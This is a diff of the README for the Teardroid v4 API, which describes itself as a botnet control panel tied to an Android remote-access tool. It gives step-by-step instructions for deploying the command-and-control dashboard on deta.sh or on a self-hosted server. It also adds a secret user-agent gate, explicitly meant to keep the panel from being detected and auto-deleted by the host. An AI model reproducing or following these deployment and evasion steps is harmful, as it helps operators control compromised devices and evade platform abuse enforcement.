@@ -1,56 +1,26 @@
 # Teardroidv4_api
+
 Teardroid v4 Botnet API
 
 This api is for teardroid v4 botnet
 
 Please visit https://github.com/ScRiPt1337/Teardroid-phprat to know about teardroid and how to use it
 
-### Deploy the Teardroid control panel ( automatically ) ( recommend )
+### Deploy the Teardroid control panel on deta.sh
 
 - Set up an account at [deta.sh](https://web.deta.sh/)
-- Login into your account and go to settings ( [settings ](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/deta_dash.png) | [create access token ](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/token2.png) )
-- click on create access token and copy the access token
-- run python3 setup.py
-- it will ask you for the access token paste the access token.
-- ![TaskManager](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/20507b2c-0668-4b21-913b-aeab369f0229.gif)
-- Done and here is your control panel url.
-- ![TaskManager](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/control_url.png)
+- [Click here](https://github.com/ScRiPt1337/Teardroidv4_api/fork) to fork this repo into your github account and click create fork
+- Teardroidv4_api repo will be forked into your account
+- Open the forked repo and click on config.py file and Change the value of "hello" to any user_agent or text you want
+- https://go.deta.dev/deploy?repo=your-repo-url reaplce your-repo-url with the url of your forked repo and open it on browser
+- and click deploy
+- change your user-agent of the browser with the value of USER_AGENT you have enter in config.py
+- you can use this chrome extension to change user useragent [extension](https://chrome.google.com/webstore/detail/custom-useragent-string/lejiafennghcpgmbpiodgofeklkpahoe)
+- DONE
 
-### Deploy the Teardroid control panel ( Manually )
+#### Deploy video on deta.sh
 
-- Set up an account at [deta.sh](https://web.deta.sh/)
-- Install [Deta Cli](https://docs.deta.sh/docs/cli/install)
-- Logging in to Deta via the CLI
-- Create a new Python Micro using the command below
-
-```bash
-$ deta new --python teardroid_control # its will create an teardroid_control folder
-```
-
-- Clone [Teardroidv4_api](https://github.com/ScRiPt1337/Teardroidv4_api) repo using the command below
-
-```bash
-$ git clone https://github.com/ScRiPt1337/Teardroidv4_api
-```
-
-- Move all Teardroidv4_api Files to teardroid_control folder using the command below
-
-```bash
-$ cd Teardroidv4_api
-$ cp -r * ../teardroid_control/
-```
-
-- Go back to the deta repo folder using the command below
-
-```bash
-$ cd ../teardroid_control/
-```
-
-- Deploy the Control panel using the following command.
-
-```bash
-$ deta deploy
-```
+!["scatter"](https://external-content.duckduckgo.com/iu/?u=https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/Animation.gif)
 
 ### Run control panel on your own server
 
@@ -79,8 +49,9 @@ $ cd Teardroidv4_api
 $ pip install -r requirements.txt
 ```
 
-- Change project key to connect with database
+- change project key to connect with database
 - Set up an account at [deta.sh](https://web.deta.sh/) and go to project keys and create a new key and copy it
+
 ```bash
 $ nano ./db/database.py
 from deta import Deta
@@ -91,6 +62,7 @@ deta = Deta(getenv("DETA_PROJECT_KEY")) => deta =  Deta("demo project key")
 # make sure your remove getenv
 ```
 
+- open config.py and change the value of "hello" to any user_agent or text you want
 - Run teardroid api
 
 ```bash
@@ -100,4 +72,11 @@ $ uvicorn main:app --host 0.0.0.0 --port 80
 # now close your terminal windows  and we are good to go
 ```
 
+- Change your user-agent of the browser with the value of USER_AGENT you have enter in config.py
+- you can use this chrome extension to change user useragent [extension](https://chrome.google.com/webstore/detail/custom-useragent-string/lejiafennghcpgmbpiodgofeklkpahoe)
 - Done
+
+### IMPORTANT NOTICE
+
+- you will not be able to access the dashboard if you dont change your user-agent with the same value of USER_AGENT inside config.py file.
+- its to make you the dashboard more secure and to protect it from geting auto deleted from deta.sh
